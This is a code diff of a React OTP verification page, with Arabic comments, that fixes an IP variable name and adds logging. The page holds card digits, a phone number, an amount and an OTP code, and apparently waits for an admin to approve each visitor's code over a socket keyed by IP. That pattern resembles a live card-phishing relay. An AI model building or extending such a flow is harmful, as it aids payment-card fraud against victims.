@@ -5,7 +5,7 @@ import { useSocket } from '../context/SocketContext';
 export default function OTPVerification() {
   const navigate = useNavigate();
   const location = useLocation();
-  const { socket } = useSocket();
+  const { socket, userIp } = useSocket();
   
   const { cardLastDigits, phoneNumber, amount, otpCode } = location.state || {};
   
@@ -62,9 +62,10 @@ export default function OTPVerification() {
     // استماع لحالة التحقق من OTP من الأدمن
     socket.on('otpVerificationStatus', (data) => {
       console.log('🔐 OTP verification status received:', data);
+      console.log('🔍 Current user IP:', userIp, 'Message IP:', data.ip);
       
       // التحقق من أن الرسالة موجهة لهذا المستخدم فقط
-      if (data.ip && data.ip !== userIP) {
+      if (data.ip && data.ip !== userIp) {
         console.log('⚠️ OTP status not for this user, ignoring');
         return;
       }
@@ -106,14 +107,12 @@ export default function OTPVerification() {
   const handleApprove = () => {
     if (!socket) return;
     
-    const userIP = sessionStorage.getItem('userIP');
-    
     setStatus('approved');
     setMessage('تم قبول الرمز بنجاح');
     
     // إرسال حالة القبول للسيرفر
     socket.emit('approveOTP', {
-      ip: userIP,
+      ip: userIp,
       otpCode,
       status: 'approved'
     });
